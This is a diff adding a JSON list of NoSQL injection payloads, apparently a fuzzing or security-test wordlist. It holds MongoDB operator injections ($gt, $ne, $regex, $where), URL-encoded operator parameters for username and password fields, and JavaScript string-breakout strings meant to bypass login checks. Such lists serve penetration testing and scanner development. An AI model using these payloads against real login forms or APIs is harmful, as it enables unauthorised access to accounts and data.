@@ -1,0 +1,14 @@
+[
+  "{\"$gt\": \"\"}",
+  "{\"$ne\": \"\"}",
+  "{\"$where\": \"1==1\"}",
+  "admin' || '1'=='1",
+  "admin' || 1==1//",
+  "{\"$regex\": \".*\"}",
+  "{\"$gt\": \"\"}",
+  "username[$gt]=&password[$gt]=",
+  "username[$ne]=&password[$ne]=",
+  "username[$regex]=.*&password[$regex]=.*",
+  "';return true;var foo='",
+  "';return (function(){return true;})();var foo='"
+]
